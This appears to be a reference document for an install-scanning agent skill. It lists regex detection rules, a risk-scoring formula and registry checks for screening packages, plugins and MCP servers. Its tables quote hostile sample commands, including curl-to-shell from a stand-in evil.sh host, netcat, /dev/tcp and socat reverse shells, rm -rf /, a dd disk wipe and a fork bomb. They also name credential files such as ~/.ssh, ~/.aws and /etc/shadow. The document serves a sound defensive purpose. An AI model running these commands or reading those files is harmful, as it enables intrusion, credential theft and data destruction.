# Detection Rules & Risk Scoring - install-guard

The disclosed reference for [`install-guard`](../SKILL.md). Loaded when the agent needs the full detection pattern table, scoring algorithm, or ecosystem-specific checks.

## Detection Pattern Table

Each category lists the grep regex used by `scan-code.sh`, what it catches, severity, and known false-positive whitelists.

### 1. Remote Execution (severity: high)

| Pattern | Catches | Notes |
|---------|---------|-------|
| `curl[[:space:]]+[^|]*\|[[:space:]]*(sh\|bash\|zsh)` | `curl http://evil.sh \| sh` | Classic remote code execution |
| `wget[^>]*\|\s*(sh\|bash)` | `wget url \| bash` | Same pattern, wget variant |
| `nc[[:space:]]+-e` | `nc -e /bin/sh host port` | Netcat reverse shell |
| `/dev/tcp/` | `bash -c 'cat /dev/tcp/host/port'` | Bash built-in reverse shell |
| `bash[[:space:]]+-i` | `bash -i >& /dev/tcp/...` | Interactive bash reverse shell |
| `/dev/udp/` | UDP-based exfiltration shell | |
| `mkfifo[[:space:]]+/tmp/.*\|[[:space:]]*sh` | Named-pipe shell | |
| `socat[[:space:]]+.*(EXEC\|exec):` | `socat EXEC:/bin/sh` | Socat reverse shell |

**Whitelist exceptions**: none. Any match is high severity. Legitimate CI scripts that pipe curl to sh should be flagged and reviewed manually.

### 2. Dynamic Execution (severity: high)

| Pattern | Catches | Notes |
|---------|---------|-------|
| `\beval[[:space:]]*\(` | `eval(userInput)` | Arbitrary code execution |
| `\bexec[[:space:]]*\(` | `exec(code)` | Python/JS exec |
| `\bFunction[[:space:]]*\(` | `new Function(body)` | JS dynamic function |
| `os\.system[[:space:]]*\(` | `os.system(cmd)` | Python shell command |
| `subprocess\.(call\|run\|Popen\|check_output)[^)]*shell[[:space:]]*=[[:space:]]*True` | `subprocess.run(cmd, shell=True)` | Shell injection risk |
| `child_process\.exec[[:space:]]*\(` | Node.js child process | |
| `vm\.runInNewContext` | Node.js VM sandbox escape | |
| `new[[:space:]]+Function[[:space:]]*\(` | JS `new Function()` | |

**Whitelist exceptions**:
- `subprocess.run(["ls"])` without `shell=True` is NOT matched (safe argument-list form).
- `crypto.createHash()` is NOT matched (different API).

### 3. Sensitive File Access (severity: high)

| Pattern | Catches | Notes |
|---------|---------|-------|
| `\.ssh/` | SSH key access | |
| `\.aws/` | AWS credentials | |
| `\.env` | Environment file with secrets | |
| `id_rsa` / `id_dsa` | Private key filenames | |
| `\.gnupg/` | GPG keys | |
| `\.npmrc` / `\.pypirc` | Package manager tokens | |
| `\.docker/config` | Docker registry credentials | |
| `credentials\.json` | Cloud credential files | |
| `\.netrc` | HTTP credentials | |
| `/etc/shadow` / `/etc/passwd` | System password files | |
| `\.kube/config` | Kubernetes credentials | |
| `\.git-credentials` | Git stored credentials | |

**Whitelist exceptions**: references in documentation (`.md` files mentioning `.env` as guidance) will still be flagged - the user should review. This is intentional; better to over-flag than miss real credential theft.

### 4. Data Exfiltration (severity: medium)

| Pattern | Catches | Notes |
|---------|---------|-------|
| `requests\.(post\|put)[[:space:]]*\(` | Python HTTP POST | Medium because legitimate code uses this |
| `fetch[[:space:]]*\(\s*["']https?://` | JS fetch to external URL | |
| `axios\.(post\|put)[[:space:]]*\(` | Axios POST | |
| `XMLHttpRequest` | Raw XHR | |
| `\.send[[:space:]]*\(\s*[^)]*(password\|token\|secret\|key\|credential)` | Sending secrets over HTTP | |
| `curl[[:space:]]+[^|]*-X[[:space:]]*POST` | curl POST | |
| `http\.Client` | Go HTTP client | |
| `urllib\.request\.urlopen` | Python urllib | |
| `dnspython` / `dns\.resolver` / `socket\.gethostbyname` | DNS-based exfiltration | |

**Whitelist exceptions**: none automated. Medium severity means the user should review context - a POST to the package's own API is normal; a POST to a raw IP or suspicious domain is not.

### 5. Code Obfuscation (severity: medium)

| Pattern | Catches | Notes |
|---------|---------|-------|
| `atob\(` / `btoa\(` | Base64 encode/decode in JS | Often used to hide payloads |
| `base64decode` / `base64\.b64decode` | Python base64 decode | |
| `binascii\.unhexlify` / `fromhex` | Hex decoding | |
| `\\x[0-9a-fA-F]{20,}` | Long hex escape sequences | Obfuscated strings |
| `String\.fromCharCode` | JS char-code obfuscation | |
| `unescape\(` | JS legacy decoding | |
| `decodeURIComponent\(\s*["']%` | URI-encoded payload | |
| `eval\(\s*atob` / `eval\(\s*Buffer\.from` | eval of decoded data | High-risk combo |

**Whitelist exceptions**: none. Obfuscation in a package is itself a red flag worth reviewing.

### 6. Destructive Operations (severity: high)

| Pattern | Catches | Notes |
|---------|---------|-------|
| `rm[[:space:]]+-rf?[[:space:]]+/` | `rm -rf /` | Root deletion |
| `rm[[:space:]]+-rf?[[:space:]]+~` | `rm -rf ~` | Home deletion |
| `rm[[:space:]]+-rf?[[:space:]]+\*` | `rm -rf *` | Wildcard deletion |
| `dd[[:space:]]+if=.*of=/dev/` | `dd` to device | Disk wipe |
| `mkfs` | Format filesystem | |
| `:[(){}:];:` | Fork bomb | |
| `shred[[:space:]]+-f` | Secure delete | |
| `truncate[[:space:]]+-s[[:space:]]+0` | Truncate to zero | |
| `>+/dev/sda` | Redirect to device | Disk overwrite |
| `chmod[[:space:]]+-R[[:space:]]+777[[:space:]]+/` | Recursive world-writable on root | |

**Whitelist exceptions**: none.

### 7. Dependency Poisoning (severity: medium)

| Pattern | Catches | Notes |
|---------|---------|-------|
| `git\+https?://[^"]+` | Git URL as dependency source | Bypasses registry checks |
| `git\+ssh://` | SSH git source | |
| `file:[/][/]` | Local file dependency | Supply chain risk |
| `"[^"]*":[[:space:]]*"[*]"` | Wildcard version spec | Accepts any version |
| `\*{2,}` | Globstar version | |
| `https?://[^"]*(raw\.githubusercontent\|gist\|pastebin\|ngrok\|bitly\|tinyurl)` | Suspicious URL sources | Shorteners/raw hosts hide real target |

**Whitelist exceptions**: `git+https` pointing to the package's own canonical repo (e.g. in `package.json` for monorepo setup) - user should review manually.

---

## Risk Scoring Algorithm

### Hard constraints (one-strike veto, take precedence over all weights)

Any of the following triggers an automatic **red UNSAFE** rating. The agent cannot override these:

| Trigger | Source |
|---------|--------|
| Any `high` severity finding from `scan-code.sh` | Step 4 |
| Any `high`/`critical` known vulnerability from dependency audit | Step 3.5 |

### Weighted scoring (only when no hard constraint is triggered)

Used to distinguish **green SAFE** from **yellow CAUTION**. Each dimension produces a 0.0-1.0 score; weighted sum maps to rating.

#### Dimension 1: Source signals (weight: 40%)

| Signal | Score contribution |
|--------|-------------------|
| Maintainer account age < 30 days | +0.3 |
| Typosquatting detected (name resembles popular package) | +0.4 |
| No LICENSE file | +0.1 |
| No README | +0.1 |
| No commits in last 90 days (GitHub) | +0.1 |
| star < 10 (GitHub/npm) or downloads < threshold (PyPI < 1000/mo, cargo < 100, gem < 1000) | +0.2 |
| Maintained by verified organization | -0.3 |
| star > 100 | -0.2 |
| Active commits in last 30 days | -0.1 |

Clamp to 0.0-1.0.

#### Dimension 2: Script scan (weight: 35%)

| Signal | Score contribution |
|--------|-------------------|
| 0 findings | 0.0 |
| 1-3 medium findings | 0.3 |
| 4-10 medium findings | 0.5 |
| > 10 medium findings | 0.7 |
| Any high finding | 1.0 (triggers hard constraint anyway) |

#### Dimension 3: Agent analysis (weight: 15%, can be overridden by script)

| Signal | Score contribution |
|--------|-------------------|
| No injection patterns found | 0.0 |
| 1-2 low-risk patterns (hidden comments, unusual Unicode) | 0.3 |
| 3+ low-risk patterns | 0.5 |
| Prompt injection text detected | 0.8 |
| Excessive permission requests | 0.7 |
| MCP tool poisoning detected | 0.9 |

If script and agent disagree (script found injection keywords, agent says clean), use script's score for this dimension.

#### Dimension 4: Known vulnerabilities (weight: 10%)

| Signal | Score contribution |
|--------|-------------------|
| No known vulnerabilities | 0.0 |
| Low severity vulnerabilities only | 0.3 |
| Medium severity vulnerabilities | 0.5 |
| High/critical vulnerabilities | 1.0 (triggers hard constraint anyway) |

### Final mapping

```
weighted_sum = (source * 0.40) + (script * 0.35) + (agent * 0.15) + (vulns * 0.10)

weighted_sum < 0.3  ->  🟢 SAFE
0.3 <= weighted_sum <= 0.6  ->  🟡 CAUTION
weighted_sum > 0.6  ->  🔴 UNSAFE
```

---

## Ecosystem-specific checks

### npm
- Registry: `https://registry.npmjs.org/<package>` (maintainers, versions, time)
- Downloads: `https://api.npmjs.org/downloads/point/last-month/<package>`
- Socket.dev score: query via `https://socket.dev/api/...` or Socket MCP if available
- Typosquatting: compare against top 1000 npm packages (Levenshtein distance < 2)

### PyPI
- Registry: `https://pypi.org/pypi/<package>/json` (info, releases, urls)
- Downloads: `https://pypistats.org/api/packages/<package>/recent`
- Typosquatting: compare against top 500 PyPI packages

### cargo
- Registry: `https://crates.io/api/v1/crates/<package>` (downloads, versions, repository)
- Typosquatting: compare against top 500 crates

### gem
- Registry: `https://rubygems.org/api/v1/gems/<package>.json` (downloads, version)
- Typosquatting: compare against top 500 gems

### GitHub repo
- API: `https://api.github.com/repos/<owner>/<repo>` (stars, forks, created_at, pushed_at, owner)
- Scorecard: `https://api.securityscorecards.dev/projects/github.com/<owner>/<repo>`
- Key Scorecard checks: Maintained, Code-Review, Pinned-Dependencies, Signed-Releases, Token-Permissions, Dangerous-Workflow

### Codex skill / Claude plugin
- Locate the source repository (usually GitHub) from the marketplace or plugin manifest
- Run GitHub checks on the source repo
- Additionally: inspect SKILL.md / plugin manifest for prompt injection (Step 5)

### MCP server
- Locate source repository from the MCP registry or package
- Run GitHub checks on the source repo
- Additionally: inspect tool definitions for tool poisoning (Step 5)

### VSCode extension
- Marketplace API: `https://marketplace.visualstudio.com/_apis/public/gallery/extensionquery`
- Check publisher verification status, install count, last updated
- Locate source repo if linked, run GitHub checks

### JetBrains plugin
- Marketplace API: `https://plugins.jetbrains.com/api/plugins/<pluginId>`
- Check publisher, downloads, rating
- Locate source repo if linked, run GitHub checks

---

## Truncation rules

- Each category: max 20 findings displayed (high severity prioritized over medium over low).
- Beyond 20: fold with `{"truncated":true,"category":"...","total":N}`.
- In the user-facing risk card (Step 7): show truncated counts per category, with "view full report" option.

## Whitelist maintenance

The scan script's whitelist is minimal by design (only excludes minified files, test directories, and vendor folders). When false positives recur for a specific safe pattern, add it to the whitelist section of the relevant category above AND update `scan-code.sh` accordingly. Never whitelist an entire category.
